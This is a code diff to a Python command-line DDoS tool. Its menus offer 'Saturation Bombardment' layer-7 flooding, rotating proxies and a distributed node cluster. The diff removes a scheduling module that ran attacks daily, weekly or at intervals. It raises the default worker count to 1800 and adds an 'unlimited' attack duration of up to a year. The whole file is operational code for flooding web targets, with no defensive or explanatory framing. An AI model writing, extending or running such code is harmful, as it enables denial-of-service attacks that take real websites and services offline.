@@ -11,7 +11,7 @@ import json
 import base64
 import signal
 import ssl as ssl_lib
-from datetime import datetime, timedelta
+from datetime import datetime
 import getpass
 
 try:
@@ -39,7 +39,8 @@ PROXY_SSL_CTX.verify_mode = ssl_lib.CERT_NONE
 
 NODES_FILE = "nodes.json"
 DEFAULT_RPS = 800
-DEFAULT_WORKERS = 800
+DEFAULT_WORKERS = 1800
+DEFAULT_DURATION_MIN = 30
 
 _INTERRUPTED = [False]
 
@@ -75,154 +76,6 @@ async def interruptible_sleep(seconds):
             return
         remaining = end - time.monotonic()
         await asyncio.sleep(min(0.5, max(0.05, remaining)))
-
-
-def fmt_duration(seconds):
-    try:
-        seconds = int(seconds)
-    except Exception:
-        return "?"
-    if seconds < 0:
-        seconds = 0
-    if seconds < 60:
-        return f"{seconds}s"
-    if seconds < 3600:
-        m = seconds // 60
-        s = seconds % 60
-        return f"{m}m {s}s" if s else f"{m}m"
-    if seconds < 86400:
-        h = seconds // 3600
-        m = (seconds % 3600) // 60
-        return f"{h}h {m}m" if m else f"{h}h"
-    d = seconds // 86400
-    h = (seconds % 86400) // 3600
-    return f"{d}d {h}h" if h else f"{d}d"
-
-
-def parse_duration(text):
-    """Parses '30s', '5m', '2h', '1d', or a plain number (seconds).
-    Returns seconds as int, or None on failure."""
-    if text is None:
-        return None
-    s = text.strip().lower()
-    if not s:
-        return None
-    units = {"s": 1, "m": 60, "h": 3600, "d": 86400}
-    if s[-1] in units:
-        try:
-            n = float(s[:-1])
-            return int(n * units[s[-1]])
-        except ValueError:
-            return None
-    try:
-        return int(s)
-    except ValueError:
-        return None
-
-
-class ScheduleConfig:
-    def __init__(self):
-        self.enabled = False
-        self.mode = "immediate"
-        self.start_time = "00:00"
-        self.start_date = ""
-        self.weekdays = []
-        self.delay_seconds = 0
-        self.interval_seconds = 0
-        self.duration_seconds = 1800
-        self.max_runs = 0
-        self.runs_completed = 0
-        self._first_run_ts = None
-
-    def reset_runs(self):
-        self.runs_completed = 0
-        self._first_run_ts = None
-
-    def clear(self):
-        self.__init__()
-
-    def describe(self):
-        if self.mode == "immediate":
-            return "Start immediately"
-        if self.mode == "delay":
-            return f"Start after {fmt_duration(self.delay_seconds)}"
-        if self.mode == "once":
-            return f"Once at {self.start_date} {self.start_time}"
-        if self.mode == "daily":
-            return f"Every day at {self.start_time}"
-        if self.mode == "weekly":
-            names = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
-            days = ", ".join(names[d] for d in sorted(self.weekdays))
-            return f"Weekly on {days} at {self.start_time}"
-        if self.mode == "interval":
-            return f"Every {fmt_duration(self.interval_seconds)}"
-        return "Unknown"
-
-    def next_run_ts(self, now=None):
-        if not self.enabled:
-            return None
-        if self.max_runs > 0 and self.runs_completed >= self.max_runs:
-            return None
-        if now is None:
-            now = time.time()
-
-        if self.mode == "immediate":
-            if self._first_run_ts is None:
-                self._first_run_ts = now
-            return self._first_run_ts
-
-        if self.mode == "delay":
-            if self._first_run_ts is None:
-                self._first_run_ts = now + self.delay_seconds
-            return self._first_run_ts
-
-        if self.mode == "once":
-            try:
-                dt = datetime.strptime(
-                    f"{self.start_date} {self.start_time}", "%Y-%m-%d %H:%M"
-                )
-                ts = dt.timestamp()
-                if ts < now - 30:
-                    return None
-                return max(ts, now)
-            except Exception:
-                return None
-
-        if self.mode == "daily":
-            try:
-                h, m = map(int, self.start_time.split(":"))
-                now_dt = datetime.now()
-                cand = now_dt.replace(hour=h, minute=m, second=0, microsecond=0)
-                if cand.timestamp() <= now:
-                    cand = cand + timedelta(days=1)
-                return cand.timestamp()
-            except Exception:
-                return None
-
-        if self.mode == "weekly":
-            try:
-                h, m = map(int, self.start_time.split(":"))
-                now_dt = datetime.now()
-                for offset in range(8):
-                    cand = (now_dt + timedelta(days=offset)).replace(
-                        hour=h, minute=m, second=0, microsecond=0
-                    )
-                    if cand.weekday() in self.weekdays and cand.timestamp() > now:
-                        return cand.timestamp()
-                return None
-            except Exception:
-                return None
-
-        if self.mode == "interval":
-            if self._first_run_ts is None:
-                self._first_run_ts = now
-                return now
-            return self._first_run_ts + self.interval_seconds * self.runs_completed
-
-        return None
-
-
-SCHEDULE = ScheduleConfig()
 
 
 NODE_SCRIPT = r'''#!/usr/bin/env python3
@@ -872,7 +725,7 @@ class LiveDashboard:
             duration = float(duration)
         except Exception:
             duration = 600.0
-        if duration <= 0 or duration > 86400 * 30:
+        if duration <= 0 or duration > 86400 * 365:
             duration = 600.0
 
         self.enabled = True
@@ -1008,7 +861,7 @@ class LiveDashboard:
             seconds = 0.0
         if seconds < 0 or seconds != seconds:
             seconds = 0.0
-        seconds = min(seconds, 86400 * 30)
+        seconds = min(seconds, 86400 * 365)
         total = int(seconds)
         if total >= 3600:
             h = total // 3600
@@ -1316,7 +1169,7 @@ class LiveDashboard:
             if elapsed < 0 or elapsed != elapsed:
                 elapsed = 0.0
             remaining = max(0.0, self.duration - elapsed)
-            if remaining > 86400 * 30:
+            if remaining > 86400 * 365:
                 remaining = 0.0
 
             budgets = self._allocate_budgets(max_total_lines)
@@ -2981,236 +2834,6 @@ async def node_management_menu():
             input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
 
 
-async def schedule_management_menu():
-    while True:
-        clear_screen()
-        print(f"""{Colors.BOLD}{Colors.CYAN}
-  ███████╗ ██████╗██╗  ██╗███████╗██████╗ ██╗   ██╗██╗     ███████╗
-  ██╔════╝██╔════╝██║  ██║██╔════╝██╔══██╗██║   ██║██║     ██╔════╝
-  ███████╗██║     ███████║█████╗  ██║  ██║██║   ██║██║     █████╗  
-  ╚════██║██║     ██╔══██║██╔══╝  ██║  ██║██║   ██║██║     ██╔══╝  
-  ███████║╚██████╗██║  ██║███████╗██████╔╝╚██████╔╝███████╗███████╗
-  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚══════╝
-{Colors.RESET}{Colors.BOLD}{Colors.DIM}         ── Advanced Attack Scheduler ──{Colors.RESET}
-""")
-
-        status = (f"{Colors.GREEN}ENABLED{Colors.RESET}"
-                  if SCHEDULE.enabled else f"{Colors.RED}DISABLED{Colors.RESET}")
-
-        print(f"  {Colors.BOLD}● CURRENT SCHEDULE{Colors.RESET}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Status            {status}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Mode              {Colors.BOLD}{SCHEDULE.mode}{Colors.RESET}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Detail            {Colors.DIM}{SCHEDULE.describe()}{Colors.RESET}")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Duration/Run      "
-              f"{Colors.BOLD}{fmt_duration(SCHEDULE.duration_seconds)}{Colors.RESET}")
-        maxr = (SCHEDULE.max_runs if SCHEDULE.max_runs > 0 else "infinite")
-        print(f"  {Colors.DIM}├─{Colors.RESET} Max Runs          {Colors.BOLD}{maxr}{Colors.RESET}")
-        print(f"  {Colors.DIM}└─{Colors.RESET} Completed Runs    {Colors.BOLD}{SCHEDULE.runs_completed}{Colors.RESET}")
-
-        if SCHEDULE.enabled:
-            try:
-                nxt = SCHEDULE.next_run_ts()
-                if nxt is not None:
-                    wait = nxt - time.time()
-                    nxt_str = datetime.fromtimestamp(nxt).strftime("%Y-%m-%d %H:%M:%S")
-                    print(f"\n  {Colors.DIM}●{Colors.RESET} Next run          "
-                          f"{Colors.CYAN}{nxt_str}{Colors.RESET}  "
-                          f"{Colors.DIM}(in {fmt_duration(max(0, wait))}){Colors.RESET}")
-                else:
-                    print(f"\n  {Colors.DIM}●{Colors.RESET} Next run          "
-                          f"{Colors.RED}none (all completed){Colors.RESET}")
-            except Exception:
-                pass
-
-        print()
-        print(f"  {Colors.BOLD}● OPERATIONS{Colors.RESET}")
-        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Configure schedule              {Colors.DIM}→ pick mode & options{Colors.RESET}")
-        print(f"  {Colors.GREEN}  [2]{Colors.RESET}  Enable / Disable schedule       {Colors.DIM}→ toggle{Colors.RESET}")
-        print(f"  {Colors.YELLOW}  [3]{Colors.RESET}  Reset run counter               {Colors.DIM}→ zero completed{Colors.RESET}")
-        print(f"  {Colors.RED}  [4]{Colors.RESET}  Clear schedule                  {Colors.DIM}→ wipe all settings{Colors.RESET}")
-        print(f"  {Colors.DIM}  [0]{Colors.RESET}  Back to main menu")
-        print()
-        print(f"  {Colors.DIM}{'─' * 68}{Colors.RESET}")
-
-        choice = input(f"\n  {Colors.BOLD}➜ Select option: {Colors.RESET}").strip().lower()
-
-        if choice == "0":
-            return
-
-        elif choice == "1":
-            print(f"\n  {Colors.BOLD}● CHOOSE SCHEDULING MODE{Colors.RESET}\n")
-            print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Immediate           {Colors.DIM}→ start as soon as attack begins{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [2]{Colors.RESET}  Delay               {Colors.DIM}→ wait N time before start{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [3]{Colors.RESET}  Once                {Colors.DIM}→ specific date & time{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [4]{Colors.RESET}  Daily               {Colors.DIM}→ every day at HH:MM{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [5]{Colors.RESET}  Weekly              {Colors.DIM}→ specific weekdays at HH:MM{Colors.RESET}")
-            print(f"  {Colors.CYAN}  [6]{Colors.RESET}  Interval            {Colors.DIM}→ repeat every N time{Colors.RESET}")
-            print()
-            mode_in = input(f"  {Colors.BOLD}➜ Select mode: {Colors.RESET}").strip()
-
-            mode_map = {"1": "immediate", "2": "delay", "3": "once",
-                        "4": "daily", "5": "weekly", "6": "interval"}
-            if mode_in not in mode_map:
-                print(f"\n  {Colors.RED}⚠ Invalid mode{Colors.RESET}")
-                input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                continue
-
-            new_mode = mode_map[mode_in]
-            new_delay = 0
-            new_start_time = "00:00"
-            new_start_date = ""
-            new_weekdays = []
-            new_interval = 0
-
-            try:
-                if new_mode == "delay":
-                    d_in = input(f"  {Colors.BOLD}➜ Delay amount (e.g. 30s, 5m, 2h) [5m]: {Colors.RESET}").strip() or "5m"
-                    new_delay = parse_duration(d_in)
-                    if not new_delay or new_delay <= 0:
-                        print(f"\n  {Colors.RED}⚠ Invalid duration{Colors.RESET}")
-                        input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                        continue
-
-                elif new_mode == "once":
-                    while True:
-                        date_in = input(f"  {Colors.BOLD}➜ Date (YYYY-MM-DD): {Colors.RESET}").strip()
-                        try:
-                            datetime.strptime(date_in, "%Y-%m-%d")
-                            new_start_date = date_in
-                            break
-                        except Exception:
-                            print(f"  {Colors.RED}⚠ Invalid date format, try again{Colors.RESET}")
-                    while True:
-                        time_in = input(f"  {Colors.BOLD}➜ Time (HH:MM) [current]: {Colors.RESET}").strip()
-                        if not time_in:
-                            time_in = datetime.now().strftime("%H:%M")
-                        try:
-                            h, m = map(int, time_in.split(":"))
-                            if 0 <= h <= 23 and 0 <= m <= 59:
-                                new_start_time = f"{h:02d}:{m:02d}"
-                                break
-                        except Exception:
-                            pass
-                        print(f"  {Colors.RED}⚠ Invalid time, try again{Colors.RESET}")
-
-                elif new_mode == "daily":
-                    while True:
-                        time_in = input(f"  {Colors.BOLD}➜ Time (HH:MM) [current]: {Colors.RESET}").strip()
-                        if not time_in:
-                            time_in = datetime.now().strftime("%H:%M")
-                        try:
-                            h, m = map(int, time_in.split(":"))
-                            if 0 <= h <= 23 and 0 <= m <= 59:
-                                new_start_time = f"{h:02d}:{m:02d}"
-                                break
-                        except Exception:
-                            pass
-                        print(f"  {Colors.RED}⚠ Invalid time, try again{Colors.RESET}")
-
-                elif new_mode == "weekly":
-                    names = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
-                    print(f"\n  {Colors.BOLD}Weekdays (1-7, comma-separated, e.g. 1,3,5){Colors.RESET}")
-                    for i, nm in enumerate(names):
-                        print(f"    {Colors.DIM}{i+1}. {nm}{Colors.RESET}")
-                    while True:
-                        wd_in = input(f"  {Colors.BOLD}➜ Days [1-5]: {Colors.RESET}").strip() or "1-5"
-                        wds = set()
-                        try:
-                            for part in wd_in.replace(" ", "").split(","):
-                                if "-" in part:
-                                    a, b = part.split("-", 1)
-                                    for x in range(int(a), int(b) + 1):
-                                        if 1 <= x <= 7:
-                                            wds.add(x - 1)
-                                else:
-                                    x = int(part)
-                                    if 1 <= x <= 7:
-                                        wds.add(x - 1)
-                            if wds:
-                                new_weekdays = sorted(wds)
-                                break
-                        except Exception:
-                            pass
-                        print(f"  {Colors.RED}⚠ Invalid, try again (e.g. 1,3,5 or 1-5){Colors.RESET}")
-                    while True:
-                        time_in = input(f"  {Colors.BOLD}➜ Time (HH:MM) [current]: {Colors.RESET}").strip()
-                        if not time_in:
-                            time_in = datetime.now().strftime("%H:%M")
-                        try:
-                            h, m = map(int, time_in.split(":"))
-                            if 0 <= h <= 23 and 0 <= m <= 59:
-                                new_start_time = f"{h:02d}:{m:02d}"
-                                break
-                        except Exception:
-                            pass
-                        print(f"  {Colors.RED}⚠ Invalid time, try again{Colors.RESET}")
-
-                elif new_mode == "interval":
-                    d_in = input(f"  {Colors.BOLD}➜ Interval (e.g. 30s, 5m, 2h) [30m]: {Colors.RESET}").strip() or "30m"
-                    new_interval = parse_duration(d_in)
-                    if not new_interval or new_interval <= 0:
-                        print(f"\n  {Colors.RED}⚠ Invalid interval{Colors.RESET}")
-                        input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                        continue
-
-                dur_in = input(f"  {Colors.BOLD}➜ Duration per run (e.g. 30s, 5m, 30m, 1h) [30m]: {Colors.RESET}").strip() or "30m"
-                dur_sec = parse_duration(dur_in)
-                if not dur_sec or dur_sec <= 0:
-                    print(f"\n  {Colors.RED}⚠ Invalid duration{Colors.RESET}")
-                    input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-                    continue
-
-                maxr_in = input(f"  {Colors.BOLD}➜ Max runs (0 = infinite) [0]: {Colors.RESET}").strip() or "0"
-                try:
-                    max_runs = int(maxr_in)
-                    if max_runs < 0:
-                        max_runs = 0
-                except ValueError:
-                    max_runs = 0
-
-            except (KeyboardInterrupt, EOFError):
-                print()
-                continue
-
-            SCHEDULE.mode = new_mode
-            SCHEDULE.delay_seconds = new_delay
-            SCHEDULE.start_time = new_start_time
-            SCHEDULE.start_date = new_start_date
-            SCHEDULE.weekdays = new_weekdays
-            SCHEDULE.interval_seconds = new_interval
-            SCHEDULE.duration_seconds = dur_sec
-            SCHEDULE.max_runs = max_runs
-            SCHEDULE.reset_runs()
-            SCHEDULE.enabled = True
-
-            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Schedule configured and ENABLED")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Mode:       {SCHEDULE.mode}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Detail:     {SCHEDULE.describe()}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} Duration:   {fmt_duration(SCHEDULE.duration_seconds)}")
-            print(f"  {Colors.DIM}└─{Colors.RESET} Max runs:   "
-                  f"{SCHEDULE.max_runs if SCHEDULE.max_runs > 0 else 'infinite'}")
-            input(f"\n  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-
-        elif choice == "2":
-            SCHEDULE.enabled = not SCHEDULE.enabled
-            state = "ENABLED" if SCHEDULE.enabled else "DISABLED"
-            color = Colors.GREEN if SCHEDULE.enabled else Colors.RED
-            print(f"\n  {color}✓{Colors.RESET} Schedule {state}")
-            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-
-        elif choice == "3":
-            SCHEDULE.reset_runs()
-            print(f"\n  {Colors.GREEN}✓{Colors.RESET} Run counter reset")
-            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-
-        elif choice == "4":
-            confirm = input(f"\n  {Colors.RED}Clear schedule? (y/N): {Colors.RESET}").strip().lower()
-            if confirm == "y":
-                SCHEDULE.clear()
-                print(f"\n  {Colors.GREEN}✓{Colors.RESET} Schedule cleared")
-            input(f"  {Colors.DIM}Press Enter to continue...{Colors.RESET}")
-
-
 async def auto_deploy_saved_nodes():
     if not NODE_MANAGER.nodes:
         return
@@ -3472,87 +3095,6 @@ def get_int_input(prompt, default, allow_zero=False, max_val=None):
             print(f"  {Colors.RED}⚠ Invalid number{Colors.RESET}")
 
 
-def run_scheduled_loop(target_url, concurrency, rps, use_proxy, safe_mode, use_nodes):
-    """Runs attacks repeatedly according to SCHEDULE until aborted or all runs done."""
-    while True:
-        next_ts = SCHEDULE.next_run_ts()
-        if next_ts is None:
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} No more scheduled runs.")
-            break
-
-        wait_sec = next_ts - time.time()
-        if wait_sec > 0.5:
-            nxt_str = datetime.fromtimestamp(next_ts).strftime("%Y-%m-%d %H:%M:%S")
-            print(f"\n  {Colors.BOLD}{Colors.CYAN}● NEXT RUN{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} At        {Colors.BOLD}{nxt_str}{Colors.RESET}")
-            print(f"  {Colors.DIM}├─{Colors.RESET} In        {fmt_duration(wait_sec)}")
-            print(f"  {Colors.DIM}└─{Colors.RESET} Press Ctrl+C to abort schedule")
-            sys.stdout.flush()
-
-            try:
-                while time.time() < next_ts:
-                    if _INTERRUPTED[0]:
-                        break
-                    rem = next_ts - time.time()
-                    if rem <= 0:
-                        break
-                    time.sleep(min(1.0, max(0.1, rem)))
-            except KeyboardInterrupt:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Schedule aborted.")
-                return
-
-            if _INTERRUPTED[0]:
-                print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Schedule aborted.")
-                return
-
-        SCHEDULE.runs_completed += 1
-        duration = SCHEDULE.duration_seconds
-
-        print(f"\n  {Colors.BOLD}{Colors.GREEN}● SCHEDULED RUN #{SCHEDULE.runs_completed}{Colors.RESET}")
-        if SCHEDULE.max_runs > 0:
-            print(f"  {Colors.DIM}├─{Colors.RESET} Progress  "
-                  f"{SCHEDULE.runs_completed}/{SCHEDULE.max_runs}")
-        else:
-            print(f"  {Colors.DIM}├─{Colors.RESET} Progress  {SCHEDULE.runs_completed}/∞")
-        print(f"  {Colors.DIM}└─{Colors.RESET} Duration  {fmt_duration(duration)}")
-        print()
-        sys.stdout.flush()
-
-        _INTERRUPTED[0] = False
-
-        try:
-            if use_nodes:
-                ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
-                asyncio.run(run_distributed_attack(
-                    target_url, concurrency, duration,
-                    use_proxy, safe_mode, ready_nodes, rps=rps))
-            else:
-                asyncio.run(run_benchmark(
-                    target_url, concurrency, duration,
-                    use_proxy, safe_mode=safe_mode, rps=rps))
-        except KeyboardInterrupt:
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Scheduled run aborted.")
-            if use_nodes:
-                ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
-                try:
-                    NODE_MANAGER.force_stop_all_sync(ready_nodes)
-                except Exception:
-                    pass
-            return
-        except Exception as e:
-            print(f"\n  {Colors.RED}⚠{Colors.RESET} Scheduled run error: {e}")
-
-        if SCHEDULE.max_runs > 0 and SCHEDULE.runs_completed >= SCHEDULE.max_runs:
-            print(f"\n  {Colors.GREEN}✓{Colors.RESET} All {SCHEDULE.max_runs} scheduled runs completed.")
-            break
-
-        try:
-            input(f"\n  {Colors.DIM}Press Enter to continue to next scheduled run (or Ctrl+C to stop)...{Colors.RESET}")
-        except (KeyboardInterrupt, EOFError):
-            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Schedule stopped by user.")
-            return
-
-
 def main_menu():
     raise_fd_limit()
 
@@ -3575,7 +3117,6 @@ def main_menu():
         print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Saturation Bombardment          {Colors.DIM}→ L7 high-concurrency{Colors.RESET}")
         print(f"  {Colors.YELLOW}  [2]{Colors.RESET}  Proxy Management                {Colors.DIM}→ rotation control{Colors.RESET}")
         print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Node Management                 {Colors.DIM}→ distributed cluster{Colors.RESET}")
-        print(f"  {Colors.GREEN}  [4]{Colors.RESET}  Schedule Management             {Colors.DIM}→ time-based automation{Colors.RESET}")
         print(f"  {Colors.RED}  [0]{Colors.RESET}  Exit")
         print()
 
@@ -3592,15 +3133,6 @@ def main_menu():
                   f"{Colors.DIM}|{Colors.RESET}  total: {Colors.MAGENTA}{len(NODE_MANAGER.nodes)}{Colors.RESET}")
         else:
             print(f"  {Colors.DIM}●{Colors.RESET} Node cluster  {Colors.DIM}empty — single-server mode{Colors.RESET}")
-
-        if SCHEDULE.enabled:
-            print(f"  {Colors.DIM}●{Colors.RESET} Schedule  "
-                  f"{Colors.GREEN}ENABLED{Colors.RESET}  "
-                  f"{Colors.DIM}|{Colors.RESET}  {SCHEDULE.describe()}  "
-                  f"{Colors.DIM}|{Colors.RESET}  duration {fmt_duration(SCHEDULE.duration_seconds)}")
-        else:
-            print(f"  {Colors.DIM}●{Colors.RESET} Schedule  {Colors.DIM}disabled — no automation{Colors.RESET}")
-
         print()
         print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")
 
@@ -3626,13 +3158,6 @@ def main_menu():
                 _restore_terminal()
                 continue
             continue
-        elif choice == "4":
-            try:
-                asyncio.run(schedule_management_menu())
-            except KeyboardInterrupt:
-                _restore_terminal()
-                continue
-            continue
         elif choice != "1":
             print(f"  {Colors.RED}⚠ Invalid choice{Colors.RESET}")
             time.sleep(1)
@@ -3641,52 +3166,22 @@ def main_menu():
         print(f"\n  {Colors.BOLD}● TARGET CONFIGURATION{Colors.RESET}\n")
         try:
             target_url = get_target_url()
-
-            use_schedule = False
-            if SCHEDULE.enabled:
-                try:
-                    nxt = SCHEDULE.next_run_ts()
-                except Exception:
-                    nxt = None
-
-                print()
-                print(f"  {Colors.BOLD}{Colors.GREEN}● ACTIVE SCHEDULE{Colors.RESET}")
-                print(f"  {Colors.DIM}├─{Colors.RESET} Mode            {Colors.BOLD}{SCHEDULE.mode}{Colors.RESET}")
-                print(f"  {Colors.DIM}├─{Colors.RESET} Detail          {Colors.DIM}{SCHEDULE.describe()}{Colors.RESET}")
-                print(f"  {Colors.DIM}├─{Colors.RESET} Duration/run    {Colors.BOLD}{fmt_duration(SCHEDULE.duration_seconds)}{Colors.RESET}")
-                maxr = SCHEDULE.max_runs if SCHEDULE.max_runs > 0 else "infinite"
-                print(f"  {Colors.DIM}├─{Colors.RESET} Max runs        {Colors.BOLD}{maxr}{Colors.RESET}")
-                if nxt is not None:
-                    nxt_str = datetime.fromtimestamp(nxt).strftime("%Y-%m-%d %H:%M:%S")
-                    wait = max(0, nxt - time.time())
-                    print(f"  {Colors.DIM}└─{Colors.RESET} Next run        "
-                          f"{Colors.CYAN}{nxt_str}{Colors.RESET}  "
-                          f"{Colors.DIM}(in {fmt_duration(wait)}){Colors.RESET}")
-                else:
-                    print(f"  {Colors.DIM}└─{Colors.RESET} Next run        "
-                          f"{Colors.RED}none{Colors.RESET}")
-                print()
-
-                ans = input(f"  {Colors.BOLD}➜ Use this schedule? "
-                            f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
-                use_schedule = (ans != "n")
-
             concurrency = get_int_input(
                 f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}{DEFAULT_WORKERS}{Colors.RESET}]: ",
                 DEFAULT_WORKERS, max_val=100000)
             rps = get_int_input(
                 f"  {Colors.BOLD}➜ Per-Worker RPS (0=unlimited) [{Colors.GREEN}{DEFAULT_RPS}{Colors.RESET}]: ",
                 DEFAULT_RPS, allow_zero=True, max_val=100000)
+            duration_min = get_int_input(
+                f"  {Colors.BOLD}➜ Attack Duration (minutes, 0=unlimited) [{Colors.GREEN}{DEFAULT_DURATION_MIN}{Colors.RESET}]: ",
+                DEFAULT_DURATION_MIN, allow_zero=True, max_val=60 * 24 * 365)
 
-            if use_schedule:
-                duration = SCHEDULE.duration_seconds
-                print(f"  {Colors.DIM}● Duration per run comes from schedule: "
-                      f"{Colors.BOLD}{fmt_duration(duration)}{Colors.RESET}")
+            if duration_min == 0:
+                duration = 86400 * 365
+                duration_disp = "unlimited"
             else:
-                dur_min = get_int_input(
-                    f"  {Colors.BOLD}➜ Attack Duration (minutes) [{Colors.GREEN}30{Colors.RESET}]: ",
-                    30, max_val=10080)
-                duration = dur_min * 60
+                duration = duration_min * 60
+                duration_disp = f"{duration_min} min"
 
             ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
                              f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
@@ -3713,24 +3208,11 @@ def main_menu():
                 ans = input(f"\n  {Colors.BOLD}➜ Distribute attack across {len(ready_nodes)} node(s)? "
                             f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
                 use_nodes = (ans != "n")
+
+            print(f"\n  {Colors.DIM}● Duration: {Colors.BOLD}{duration_disp}{Colors.RESET}")
         except (KeyboardInterrupt, EOFError):
             _restore_terminal()
             print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Configuration canceled — returning to menu")
-            continue
-
-        if use_schedule:
-            try:
-                run_scheduled_loop(target_url, concurrency, rps,
-                                   use_proxy, safe_mode, use_nodes)
-            except KeyboardInterrupt:
-                _restore_terminal()
-                print(f"\n\n  {Colors.YELLOW}⚠{Colors.RESET} Schedule aborted.")
-                time.sleep(0.5)
-                continue
-            try:
-                input(f"\n  {Colors.DIM}Press Enter to return to menu...{Colors.RESET}")
-            except (KeyboardInterrupt, EOFError):
-                _restore_terminal()
             continue
 
         try:
